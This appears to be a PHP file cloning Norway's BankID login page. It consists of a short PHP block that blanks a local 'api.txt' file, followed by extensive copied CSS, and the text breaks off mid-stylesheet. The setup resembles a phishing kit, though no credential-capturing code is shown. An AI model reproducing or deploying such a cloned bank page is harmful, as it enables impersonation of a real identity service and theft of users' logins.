﻿<?php
  $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);


 ?>
<!doctype html>
<html lang="nb">

    <head>
        <link rel="icon" data-savepage-href="" href="" />
        <meta charset="UTF-8" />
        <title>BankID</title>
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes,viewport-fit=cover" />
        <style data-savepage-href="">
            body,
            html {
                border: 0;
                font-family: inherit;
                font-size: 100%;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                vertical-align: baseline;
            }
            a,
            abbr,
            acronym,
            address,
            applet,
            article,
            aside,
            audio,
            b,
            big,
            blockquote,
            canvas,
            caption,
            center,
            cite,
            code,
            dd,
            del,
            details,
            dfn,
            div,
            dl,
            dt,
            em,
            embed,
            fieldset,
            figcaption,
            figure,
            footer,
            form,
            h1,
            h2,
            h3,
            h4,
            h5,
            h6,
            header,
            hgroup,
            i,
            iframe,
            img,
            ins,
            kbd,
            label,
            legend,
            li,
            mark,
            menu,
            nav,
            object,
            ol,
            output,
            p,
            pre,
            q,
            ruby,
            s,
            samp,
            section,
            small,
            span,
            strike,
            strong,
            sub,
            summary,
            sup,
            table,
            tbody,
            td,
            tfoot,
            th,
            thead,
            time,
            tr,
            tt,
            u,
            ul,
            var,
            video {
                border: 0;
                font-family: inherit;
                font-size: inherit;
                font-style: inherit;
                font-variant: inherit;
                font-weight: inherit;
                margin: 0;
                padding: 0;
                vertical-align: baseline;
            }
            article,
            aside,
            details,
            figcaption,
            figure,
            footer,
            header,
            hgroup,
            menu,
            nav,
            section {
                display: block;
            }
            body {
                line-height: 1;
            }
            ol,
            ul {
                list-style: none;
            }
            blockquote,
            q {
                quotes: none;
            }
            blockquote:after,
            blockquote:before,
            q:after,
            q:before {
                content: "";
                content: none;
            }
            table {
                border-collapse: collapse;
                border-spacing: 0;
            }
            * {
                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
            }
            :focus {
                outline: none;
                outline-offset: -2px;
            }
            :focus::-moz-focus-inner {
                border: 0;
            }
            button,
            input,
            select,
            textarea {
                -webkit-appearance: none;
                background: none;
                border: none;
                -moz-box-shadow: none;
                color: inherit;
                font-family: inherit;
                font-size: inherit;
                letter-spacing: inherit;
                margin: 0;
                outline: none;
                padding: 0;
            }
            input::-webkit-input-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input::-moz-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input:-ms-input-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input::-ms-input-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input::placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            :root {
                --bgColor-default: #faf7f4;
                --bgColor-elevated: #fff;
                --bgColor-state-hover: #ebeeeb;
                --bgColor-state-active: #dadeda;
                --bgColor-interactive-rest: var(--bgColor-elevated);
                --bgColor-interactive-hover: var(--bgColor-state-hover);
                --bgColor-interactive-active: var(--bgColor-state-active);
                --bgColor-interactive-variant: #c9fb88;
                --bgColor-variant: #c9fb88;
                --bgColor-backdrop-rest: rgba(0, 0, 0, 0.4);
                --bgColor-backdrop-merchant: var(--bgColor-default);
                --fgColor-default: #121a12;
                --fgColor-subtle: #4d514c;
                --fgColor-link-rest: #156200;
                --fgColor-link-hover: #0d4904;
                --fgColor-link-active: #0b3208;
                --fgColor-variant: #39134c;
                --fgColor-status-danger: #8b000f;
                --fgColor-status-success: #093d05;
                --fgColor-inverted: #f9f5ff;
                --borderColor-default: #6a6867;
                --borderColor-muted: #dadeda;
                --borderColor-variant: #121a12;
                --borderColor-focusVariant: #121a12;
                --borderColor-focus: #121a12;
                --borderColor-status-danger: #8b000f;
                --borderColor-hover: rgba(0, 0, 0, 0.302);
                --component-Document-borderColor-body: #ebeeeb;
                --component-Button-outline-borderColor-rest: #39134c;
                --component-Button-outline-borderColor-hover: #39134c;
                --component-Button-outline-borderColor-active: #39134c;
                --component-Button-filled-bgColor-rest: #39134c;
                --component-Button-filled-bgColor-hover: #47146a;
                --component-Button-filled-bgColor-active: #551488;
                --component-Button-filled-bgColor-invalid: rgba(249, 247, 255, 0.702);
                --app-Scrollbar-bgColor-default: rgba(0, 0, 0, 0.071);
                --app-Scrollbar-fgColor-default: var(--fgColor-inverted);
                --brand: var(--fgColor-variant);
            }
            @media (prefers-color-scheme: dark) {
                html:not([data-theme]) {
                    --bgColor-default: #0f150f;
                    --bgColor-elevated: #1d211d;
                    --bgColor-state-hover: #3c403b;
                    --bgColor-state-active: #4d514c;
                    --bgColor-interactive-rest: var(--bgColor-elevated);
                    --bgColor-interactive-hover: var(--bgColor-state-hover);
                    --bgColor-interactive-active: var(--bgColor-state-active);
                    --bgColor-interactive-variant: #c9fb88;
                    --bgColor-variant: #093d05;
                    --bgColor-backdrop-rest: hsla(0, 0%, 100%, 0.4);
                    --bgColor-backdrop-merchant: var(--bgColor-default);
                    --fgColor-default: #eaecea;
                    --fgColor-subtle: #ccd1cc;
                    --fgColor-link-rest: #c9fb88;
                    --fgColor-link-hover: #b0f666;
                    --fgColor-link-active: #96f143;
                    --fgColor-variant: #caafff;
                    --fgColor-status-danger: #ffd9d9;
                    --fgColor-status-success: #67e702;
                    --fgColor-inverted: #121a12;
                    --borderColor-default: #cac7c3;
                    --borderColor-muted: #333732;
                    --borderColor-variant: #fff;
                    --borderColor-focusVariant: #fff;
                    --borderColor-focus: #fff;
                    --borderColor-status-danger: #ffd9d9;
                    --borderColor-hover: hsla(0, 0%, 100%, 0.302);
                    --component-Document-borderColor-body: hsla(0, 0%, 100%, 0);
                    --component-Button-outline-borderColor-rest: #caafff;
                    --component-Button-outline-borderColor-hover: #caafff;
                    --component-Button-outline-borderColor-active: #caafff;
                    --component-Button-filled-bgColor-rest: #c09fff;
                    --component-Button-filled-bgColor-hover: #caafff;
                    --component-Button-filled-bgColor-active: #d5beff;
                    --component-Button-filled-bgColor-invalid: rgba(249, 247, 255, 0.702);
                    --app-Scrollbar-bgColor-default: hsla(0, 0%, 100%, 0.2);
                    --app-Scrollbar-fgColor-default: var(--fgColor-inverted);
                    --brand: #fff;
                }
            }
            html[data-theme="dark"] {
                --bgColor-default: #0f150f;
                --bgColor-elevated: #1d211d;
                --bgColor-state-hover: #3c403b;
                --bgColor-state-active: #4d514c;
                --bgColor-interactive-rest: var(--bgColor-elevated);
                --bgColor-interactive-hover: var(--bgColor-state-hover);
                --bgColor-interactive-active: var(--bgColor-state-active);
                --bgColor-interactive-variant: #c9fb88;
                --bgColor-variant: #093d05;
                --bgColor-backdrop-rest: hsla(0, 0%, 100%, 0.4);
                --bgColor-backdrop-merchant: var(--bgColor-default);
                --fgColor-default: #eaecea;
                --fgColor-subtle: #ccd1cc;
                --fgColor-link-rest: #c9fb88;
                --fgColor-link-hover: #b0f666;
                --fgColor-link-active: #96f143;
                --fgColor-variant: #caafff;
                --fgColor-status-danger: #ffd9d9;
                --fgColor-status-success: #67e702;
                --fgColor-inverted: #121a12;
                --borderColor-default: #cac7c3;
                --borderColor-muted: #333732;
                --borderColor-variant: #fff;
                --borderColor-focusVariant: #fff;
                --borderColor-focus: #fff;
                --borderColor-status-danger: #ffd9d9;
                --borderColor-hover: hsla(0, 0%, 100%, 0.302);
                --component-Document-borderColor-body: hsla(0, 0%, 100%, 0);
                --component-Button-outline-borderColor-rest: #caafff;
                --component-Button-outline-borderColor-hover: #caafff;
                --component-Button-outline-borderColor-active: #caafff;
                --component-Button-filled-bgColor-rest: #c09fff;
                --component-Button-filled-bgColor-hover: #caafff;
                --component-Button-filled-bgColor-active: #d5beff;
                --component-Button-filled-bgColor-invalid: rgba(249, 247, 255, 0.702);
                --app-Scrollbar-bgColor-default: hsla(0, 0%, 100%, 0.2);
                --app-Scrollbar-fgColor-default: var(--fgColor-inverted);
                --brand: #fff;
            }
            html[data-theme="dark"] #app {
                color-scheme: dark;
            }
            :root {
                --spacing-6XS: 2px;
                --spacing-5XS: 4px;
                --spacing-4XS: 6px;
                --spacing-3XS: 8px;
                --spacing-2XS: 10px;
                --spacing-XS: 12px;
                --spacing-S: 16px;
                --spacing-M: 24px;
                --spacing-L: 32px;
                --borderRadius-2XS: 4px;
                --borderRadius-XS: 8px;
                --borderRadius-S: 12px;
                --borderRadius-M: 18px;
                --borderRadius-L: 24px;
                --borderRadius-interactive-M: 8px;
                --borderRadius-interactive-L: 8px;
                --fontSize-S: 14px;
                --fontSize-M: 16px;
                --fontSize-L: 18px;
                --fontSize-XL: 20px;
                --fontSize-2XL: 24px;
                --fontSize-3XL: 26px;
                --component-OtpChallenge-fontSize-L: 36px;
                --component-OtpChallenge-spinner: 60px;
                --component-Form-height-large: 285px;
                --component-Form-width-large: 320px;
                --component-Form-width-medium: 360px;
                --component-Form-gap-inputs: var(--spacing-2XS);
                --component-Button-Round-size-M: 18px;
                --component-Button-Round-size-L: 22px;
                --component-Button-height-L: 32px;
                --component-Button-height-M: 26px;
                --component-Button-height-S: 20px;
                --component-Error-icon-L: 48px;
                --sizing-interactive-M: 38px;
                --sizing-interactive-L: 48px;
                --sizing-icon-S: 16px;
                --sizing-icon-M: 20px;
                --sizing-icon-L: 24px;
                --sizing-content-width: 370px;
                --sizing-content-height: 250px;
                --borderSize-focus: 2px;
                --borderSize-focusOuter: 3px;
                --borderSize-underline: 2px;
                --app-Width: 450px;
                --app-Height: 520px;
                --app-borderRadius-L: 16px;
                --app-padding-horizontal: 16px;
                --app-padding-vertical: 10px;
                --app-padding-content: 4px;
                --app-Body-height: 390px;
                --app-Modal-padding-top: 20px;
                --app-Modal-padding-bottom: 16px;
                --gap-content-L: 10px;
                --shadow-focus: inset 0px 0px 0px var(--borderSize-focus) var(--fgColor-default);
                --shadow-focusOuter: 0px 0px 0px 1px var(--bgColor-default),
                    0px 0px 0px var(--borderSize-focusOuter) var(--fgColor-default);
                --shadow-danger: inset 0px 0px 0px 1px var(--fgColor-status-danger);
                --shadow-dangerFocus: inset 0px 0px 0px var(--borderSize-focus) var(--fgColor-status-danger);
                --shadow-hover: 0px 4px 4px 0px var(--borderColor-hover);
                --shadow-button-outline-rest: inset 0px 0px 0px 1px var(--fgColor-variant);
                --shadow-button-outline-hover: inset 0px 0px 0px 1px var(--fgColor-variant);
                --shadow-button-outline-active: inset 0px 0px 0px 1px var(--fgColor-variant);
                --shadow-form-rest: inset 0px 0px 0px 1px var(--fgColor-default);
            }
            @media screen and (max-height: 350px) {
                :root {
                    --spacing-6XS: 1px;
                    --spacing-5XS: 2px;
                    --spacing-4XS: 4px;
                    --spacing-3XS: 6px;
                    --spacing-2XS: 8px;
                    --spacing-XS: 10px;
                    --spacing-S: 12px;
                    --spacing-M: 16px;
                    --spacing-L: 24px;
                    --borderRadius-2XS: 2px;
                    --borderRadius-XS: 4px;
                    --borderRadius-S: 8px;
                    --borderRadius-M: 12px;
                    --borderRadius-L: 18px;
                    --borderRadius-interactive-M: 4px;
                    --borderRadius-interactive-L: 4px;
                    --fontSize-S: 14px;
                    --fontSize-M: 16px;
                    --fontSize-L: 18px;
                    --fontSize-XL: 20px;
                    --fontSize-2XL: 24px;
                    --fontSize-3XL: 26px;
                    --component-OtpChallenge-fontSize-L: 30px;
                    --component-OtpChallenge-spinner: 40px;
                    --component-Form-height-large: 160px;
                    --component-Form-width-large: 360px;
                    --component-Form-width-medium: 300px;
                    --component-Form-gap-inputs: var(--spacing-2XS);
                    --component-Button-Round-size-M: 16px;
                    --component-Button-Round-size-L: 20px;
                    --component-Button-height-L: 26px;
                    --component-Button-height-M: 22px;
                    --component-Button-height-S: 16px;
                    --component-Error-icon-L: 36px;
                    --sizing-interactive-M: 28px;
                    --sizing-interactive-L: 38px;
                    --sizing-icon-S: 14px;
                    --sizing-icon-M: 16px;
                    --sizing-icon-L: 20px;
                    --sizing-content-width: 370px;
                    --sizing-content-height: 0px;
                    --borderSize-focus: 2px;
                    --borderSize-focusOuter: 3px;
                    --borderSize-underline: 2px;
                    --app-Width: 396px;
                    --app-Height: 300px;
                    --app-borderRadius-L: 8px;
                    --app-padding-horizontal: 8px;
                    --app-padding-vertical: 8px;
                    --app-padding-content: 4px;
                    --app-Body-height: 260px;
                    --app-Modal-padding-top: 16px;
                    --app-Modal-padding-bottom: 10px;
                    --gap-content-L: 6px;
                }
            }
            :root {
                --font-body-S-Regular: 400 var(--fontSize-S) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-S-Regular-lineHeight: calc(var(--fontSize-S) * 1.17);
                --font-body-S-Medium: 500 var(--fontSize-S) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-S-Medium-lineHeight: calc(var(--fontSize-S) * 1.17);
                --font-body-S-Bold: 600 var(--fontSize-S) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-S-Bold-lineHeight: calc(var(--fontSize-S) * 1.17);
                --font-body-M-Regular: 400 var(--fontSize-M) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-M-Regular-lineHeight: calc(var(--fontSize-M) * 1.17);
                --font-body-M-Medium: 500 var(--fontSize-M) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-M-Medium-lineHeight: calc(var(--fontSize-M) * 1.17);
                --font-body-L-Regular: 400 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-L-Regular-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-body-L-Medium: 500 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-L-Medium-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-body-XL-Bold: 600 var(--fontSize-XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-XL-Bold-lineHeight: calc(var(--fontSize-XL) * 1.17);
                --font-body-2XL-Bold: 600 var(--fontSize-2XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-2XL-Bold-lineHeight: calc(var(--fontSize-2XL) * 1.17);
                --font-heading-S-Medium: 500 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-S-Medium-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-heading-S-Bold: 700 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-S-Bold-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-heading-M-Bold: 600 var(--fontSize-XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-M-Bold-lineHeight: calc(var(--fontSize-XL) * 1.17);
                --font-heading-L-Bold: 600 var(--fontSize-2XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-L-Bold-lineHeight: calc(var(--fontSize-2XL) * 1.17);
                --font-heading-XL-Bold: 600 var(--fontSize-3XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-XL-Bold-lineHeight: calc(var(--fontSize-3XL) * 1.17);
                --font-OtpChallenge-Reference-L: 600 var(--component-OtpChallenge-fontSize-L) / 1.17 -apple-system,
                    BlinkMacSystemFont, sans-serif;
                --font-OtpChallenge-Reference-L-lineHeight: calc(var(--component-OtpChallenge-fontSize-L) * 1.17);
                --font-Document-L: 400 var(--fontSize-M) / 1.17 Courier;
                --font-Document-L-lineHeight: calc(var(--fontSize-M) * 1.17);
                --full-dvh: 100%;
            }
            @supports (height: 100vh) {
                :root {
                    --full-dvh: 100vh;
                }
            }
            @supports (height: 100dvh) {
                :root {
                    --full-dvh: 100dvh;
                }
            }
            body,
            html {
                margin: 0;
                padding: 0;
            }
            html {
                bottom: 0;
                left: 0;
                overflow: hidden;
                position: absolute;
                right: 0;
                top: 0;
            }
            body,
            html {
                overscroll-behavior-y: contain;
            }
            body {
                -webkit-overflow-scrolling: touch;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
                -webkit-text-size-adjust: none;
                background-color: var(--bgColor-backdrop-merchant);
                color: var(--fgColor-default);
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: 10px;
                height: var(--full-dvh, 100%);
                letter-spacing: 0;
                max-height: -webkit-fill-available;
                overflow-y: auto;
                -ms-touch-action: manipulation;
                touch-action: manipulation;
                -webkit-transform: translateZ(0);
                transform: translateZ(0);
            }
            .bid-view {
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                display: grid;
                height: 100%;
                justify-items: center;
            }
            @-webkit-keyframes spin {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                to {
                    -webkit-transform: rotate(1turn);
                    transform: rotate(1turn);
                }
            }
            @keyframes spin {
                0% {
                    -webkit-transform: rotate(0deg);
                    transform: rotate(0deg);
                }
                to {
                    -webkit-transform: rotate(1turn);
                    transform: rotate(1turn);
                }
            }
            .bid-static {
                position: relative;
            }
            .bid-static,
            body #app {
                height: 100%;
                width: 100%;
            }
            body.fullscreen {
                background-color: transparent;
                height: var(--fullscreen-height, var(--full-dvh, 100%));
                padding-top: env(safe-area-inset-top, 0);
            }
            body.fullscreen .appViewport {
                height: 100%;
                width: 100%;
            }
            body.fullscreen #app {
                background-color: var(--bgColor-default);
                border-radius: 20px;
            }
            body.fullscreen #storybook-root {
                background-color: transparent;
            }
            body .appViewport {
                -webkit-box-align: center;
                -ms-flex-align: center;
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                align-items: center;
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                justify-content: center;
                min-height: 100%;
                overflow-x: hidden;
            }
            body.app {
                background-color: var(--bgColor-default);
                -webkit-transition: background-color 0.25s ease-in-out;
                transition: background-color 0.25s ease-in-out;
            }
            body.app #app {
                border-radius: 0;
            }
            body.app #storybook-root {
                background-color: var(--bgColor-default);
            }
            .uwnxns3cpOc- {
                bottom: 0;
                left: 0;
                overflow-y: hidden;
                position: absolute;
                right: 0;
                top: 0;
                -webkit-transition: opacity 0.25s ease-in-out;
                transition: opacity 0.25s ease-in-out;
            }
            .FpzL5vI50-o- {
                opacity: 0;
            }
            .FpzL5vI50-o-.pTZAeuSiHLM- {
                opacity: 1;
            }
            .FpzL5vI50-o-.pTZAeuSiHLM-:not([data-direction]),
            .FpzL5vI50-o-.pTZAeuSiHLM-[data-direction="left"] {
                -webkit-animation: -wFPH-tfz3A- 0.25s ease-in-out;
                animation: -wFPH-tfz3A- 0.25s ease-in-out;
            }
            .FpzL5vI50-o-.pTZAeuSiHLM-[data-direction="right"] {
                -webkit-animation: f4OBTss8AyM- 0.25s ease-in-out;
                animation: f4OBTss8AyM- 0.25s ease-in-out;
            }
            .FpzL5vI50-o-.pTZAeuSiHLM-[data-direction="fade"] {
                -webkit-animation: -qLsU16u7eY- 0.25s ease-in-out;
                animation: -qLsU16u7eY- 0.25s ease-in-out;
            }
            .OFS8sUsZKqg- {
                opacity: 1;
            }
            .OFS8sUsZKqg-.pTZAeuSiHLM- {
                opacity: 0;
            }
            .OFS8sUsZKqg-.pTZAeuSiHLM-:not([data-direction]),
            .OFS8sUsZKqg-.pTZAeuSiHLM-[data-direction="left"] {
                -webkit-animation: ByndSDyYVI8- 0.25s ease-in-out;
                animation: ByndSDyYVI8- 0.25s ease-in-out;
            }
            .OFS8sUsZKqg-.pTZAeuSiHLM-[data-direction="right"] {
                -webkit-animation: UAqC9KOGNm8- 0.25s ease-in-out;
                animation: UAqC9KOGNm8- 0.25s ease-in-out;
            }
            .OFS8sUsZKqg-.pTZAeuSiHLM-[data-direction="fade"] {
                -webkit-animation: noUcs9YEink- 0.25s ease-in-out;
                animation: noUcs9YEink- 0.25s ease-in-out;
            }
            .MNJRkYmiNJo- {
                display: grid;
                grid-template-columns: 1fr;
                grid-template-rows: 1fr;
                position: relative;
                -webkit-transition: height 0.25s ease-in-out;
                transition: height 0.25s ease-in-out;
            }
            .MNJRkYmiNJo-.qffLC-ogfJs-.qyz-s5DR8Vw- {
                grid-template-columns: 1fr;
                grid-template-rows: -webkit-max-content;
                grid-template-rows: max-content;
            }
            @-webkit-keyframes f4OBTss8AyM- {
                0% {
                    opacity: 0;
                    -webkit-transform: translateX(-100%);
                    transform: translateX(-100%);
                }
                to {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
            }
            @keyframes f4OBTss8AyM- {
                0% {
                    opacity: 0;
                    -webkit-transform: translateX(-100%);
                    transform: translateX(-100%);
                }
                to {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
            }
            @-webkit-keyframes -wFPH-tfz3A- {
                0% {
                    opacity: 0;
                    -webkit-transform: translateX(100%);
                    transform: translateX(100%);
                }
                to {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
            }
            @keyframes -wFPH-tfz3A- {
                0% {
                    opacity: 0;
                    -webkit-transform: translateX(100%);
                    transform: translateX(100%);
                }
                to {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
            }
            @-webkit-keyframes -qLsU16u7eY- {
                0% {
                    opacity: 0;
                }
                to {
                    opacity: 1;
                }
            }
            @keyframes -qLsU16u7eY- {
                0% {
                    opacity: 0;
                }
                to {
                    opacity: 1;
                }
            }
            @-webkit-keyframes UAqC9KOGNm8- {
                0% {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
                to {
                    opacity: 0;
                    -webkit-transform: translateX(100%);
                    transform: translateX(100%);
                }
            }
            @keyframes UAqC9KOGNm8- {
                0% {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
                to {
                    opacity: 0;
                    -webkit-transform: translateX(100%);
                    transform: translateX(100%);
                }
            }
            @-webkit-keyframes ByndSDyYVI8- {
                0% {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
                to {
                    opacity: 0;
                    -webkit-transform: translateX(-100%);
                    transform: translateX(-100%);
                }
            }
            @keyframes ByndSDyYVI8- {
                0% {
                    opacity: 1;
                    -webkit-transform: translateX(0);
                    transform: translateX(0);
                }
                to {
                    opacity: 0;
                    -webkit-transform: translateX(-100%);
                    transform: translateX(-100%);
                }
            }
            @-webkit-keyframes noUcs9YEink- {
                0% {
                    opacity: 1;
                }
                to {
                    opacity: 1;
                }
            }
            @keyframes noUcs9YEink- {
                0% {
                    opacity: 1;
                }
                to {
                    opacity: 1;
                }
            }
            .VGjB0ReHXLQ- svg path,
            .VGjB0ReHXLQ- svg polygon,
            .VGjB0ReHXLQ- svg rect {
                fill: var(--brand);
            }
            .wup5P-GPUUY- {
                --header: minmax(30px, 1fr);
                --body: 8fr;
                background-color: var(--bgColor-default);
                border: 1px solid var(--borderColor-muted);
                border-radius: var(--app-borderRadius-L);
                display: grid;
                grid-template-rows: var(--header) var(--body);
                height: 100%;
                padding: 0 var(--app-padding-horizontal);
                -webkit-transition: grid-template-rows 0.15s ease-in-out;
                transition: grid-template-rows 0.15s ease-in-out;
                transition:
                    grid-template-rows 0.15s ease-in-out,
                    -ms-grid-rows 0.15s ease-in-out;
            }
            .wup5P-GPUUY- .uLsXIdeN3YE- {
                display: grid;
                grid-template-columns: 1fr;
                grid-template-rows: 1fr;
                height: 100%;
                padding-bottom: var(--app-padding-vertical);
            }
            .wup5P-GPUUY-.aDKuqwbusZA- {
                max-height: var(--full-dvh, 100%);
                overflow-y: auto;
                overscroll-behavior-y: contain;
            }
            @media screen and (max-width: 470px) {
                .wup5P-GPUUY-.aDKuqwbusZA- .uLsXIdeN3YE- {
                    scrollbar-width: thin;
                }
            }
            .RnM5kkyLJe8- {
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                display: grid;
                gap: var(--gap-content-L);
                justify-items: center;
            }
            .RnM5kkyLJe8- h1 {
                justify-self: center;
            }
            .qRkl-QO8NSU- {
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-S);
                font-weight: 400;
                letter-spacing: 0;
                line-height: 1.17;
            }
            .-Xh-zxc-5iU- {
                display: grid;
                height: 100%;
                padding: 0 10px;
                -webkit-transition: grid-template-columns 0.15s ease-in-out;
                transition: grid-template-columns 0.15s ease-in-out;
                transition:
                    grid-template-columns 0.15s ease-in-out,
                    -ms-grid-columns 0.15s ease-in-out;
            }
            .-Xh-zxc-5iU- > * {
                -ms-flex-item-align: center;
                align-self: center;
                justify-self: center;
            }
            .-Xh-zxc-5iU- .T6JudSrF7xU- {
                display: grid;
                grid-template-columns: 1fr;
                grid-template-rows: 1fr;
                height: 100%;
                width: 100%;
            }
            body:not(.fullscreen) .-Xh-zxc-5iU- {
                grid-template-columns: minmax(320px, 450px);
                grid-template-rows: minmax(520px, 1fr) 48px;
            }
            @media screen and (max-height: 568px) {
                body:not(.fullscreen) .-Xh-zxc-5iU- {
                    grid-template-rows: minmax(calc(var(--full-dvh, 100%) - 48px), 1fr) 48px;
                }
            }
            body.fullscreen .-Xh-zxc-5iU- {
                grid-template-columns: minmax(320px, 100vw);
                grid-template-rows: minmax(100%, 1fr) 0;
                padding: 0;
            }
            body.fullscreen .-Xh-zxc-5iU- > :nth-child(2) {
                display: none;
            }
            body.fullscreen .-Xh-zxc-5iU- .T6JudSrF7xU- {
                grid-row: 1 / span 2;
            }
            .-Xh-zxc-5iU-.SqOjRcRLOCA- {
                -ms-grid-columns: minmax(320px, 800px) !important;
                grid-template-columns: minmax(320px, 800px) !important;
            }
            .-Xh-zxc-5iU-.RFXvSlFAdVU- {
                -ms-grid-columns: minmax(320px, 100vw) !important;
                grid-template-columns: minmax(320px, 100vw) !important;
            }
            .-Xh-zxc-5iU- ._33xW61ylm3E- {
                -ms-flex-item-align: end;
                align-self: flex-end;
                justify-self: auto;
                width: 100%;
            }
            .-Xh-zxc-5iU- .Cbrq5-nkab0- {
                -ms-flex-item-align: center;
                align-self: center;
            }
            .qRkl-QO8NSU- {
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                border: 1px solid transparent;
                border-radius: var(--borderRadius-L);
                -webkit-box-shadow: var(--button-icon--shadow);
                box-shadow: var(--button-icon--shadow);
                color: var(--fgColor-subtle);
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                gap: var(--spacing-5XS);
                height: var(--component-Button-height-L);
                padding: 0 var(--spacing-S);
                position: relative;
                text-decoration: underline;
                -webkit-transition: opacity 0.15s ease-in-out;
                transition: opacity 0.15s ease-in-out;
                white-space: nowrap;
            }
            .qRkl-QO8NSU-:disabled {
                opacity: 0.5;
            }
            .qRkl-QO8NSU-:not(:disabled) {
                cursor: pointer;
            }
            .qRkl-QO8NSU-:not(:disabled):hover {
                text-decoration: none;
            }
            .qRkl-QO8NSU-:not(:disabled):active,
            .qRkl-QO8NSU-:not(:disabled):focus {
                border-color: var(--fgColor-subtle);
            }
            .wZGPbQu3nk4- {
                -webkit-animation: _1aJkBdotzq0- 1.75s ease-in-out infinite;
                animation: _1aJkBdotzq0- 1.75s ease-in-out infinite;
                height: 100%;
                width: 100%;
            }
            .wZGPbQu3nk4- path {
                fill: var(--fgColor-variant);
            }
            .wZGPbQu3nk4-.XMbYIcZVlP8- path {
                fill: var(--fgColor-inverted);
            }
            @-webkit-keyframes _1aJkBdotzq0- {
                0% {
                    -webkit-transform: rotate(0);
                    transform: rotate(0);
                }
                20% {
                    -webkit-transform: rotate(175deg);
                    transform: rotate(175deg);
                }
                50% {
                    -webkit-transform: rotate(180deg);
                    transform: rotate(180deg);
                }
                70% {
                    -webkit-transform: rotate(355deg);
                    transform: rotate(355deg);
                }
                to {
                    -webkit-transform: rotate(1turn);
                    transform: rotate(1turn);
                }
            }
            @keyframes _1aJkBdotzq0- {
                0% {
                    -webkit-transform: rotate(0);
                    transform: rotate(0);
                }
                20% {
                    -webkit-transform: rotate(175deg);
                    transform: rotate(175deg);
                }
                50% {
                    -webkit-transform: rotate(180deg);
                    transform: rotate(180deg);
                }
                70% {
                    -webkit-transform: rotate(355deg);
                    transform: rotate(355deg);
                }
                to {
                    -webkit-transform: rotate(1turn);
                    transform: rotate(1turn);
                }
            }
            ._7UwQxER6Uc8- {
                color: var(--fgColor-subtle);
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-L);
                font-weight: 400;
                -ms-hyphens: auto;
                hyphens: auto;
                letter-spacing: 0;
                line-height: 1.17;
                overflow-wrap: break-word;
                text-align: left;
                white-space: pre-wrap;
                word-break: break-word;
            }
            ._7UwQxER6Uc8- pre {
                display: inline-block;
                font-family: monospace;
                font-weight: 600;
            }
            ._58RiAyzWWew- {
                color: var(--fgColor-default);
                display: block;
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-3XL);
                font-weight: 600;
                letter-spacing: 0;
                line-height: 1.17;
            }
            .a-O3AScSr-A- {
                -ms-flex-item-align: center;
                align-self: center;
                justify-self: center;
                max-width: 370px;
                min-height: 250px;
                width: 100%;
            }
            @media screen and (max-height: 350px) {
                .a-O3AScSr-A- {
                    min-height: auto;
                }
            }
            .GfdhxHv-UH0- {
                margin: auto;
                width: 80px;
            }
            @media screen and (max-height: 220px) {
                .GfdhxHv-UH0- {
                    width: 60px;
                }
            }
            ._4-eZgDdM8zs- {
                --button--color: var(--fgColor-default);
                --button--background-color: var(--bgColor-default);
                -webkit-box-align: center;
                -ms-flex-align: center;
                -ms-flex-negative: 0;
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                align-items: center;
                background: var(--component-Button-filled-bgColor-rest);
                border-radius: 999px;
                color: var(--fgColor-inverted);
                display: -webkit-inline-box;
                display: -ms-inline-flexbox;
                display: inline-flex;
                flex-shrink: 0;
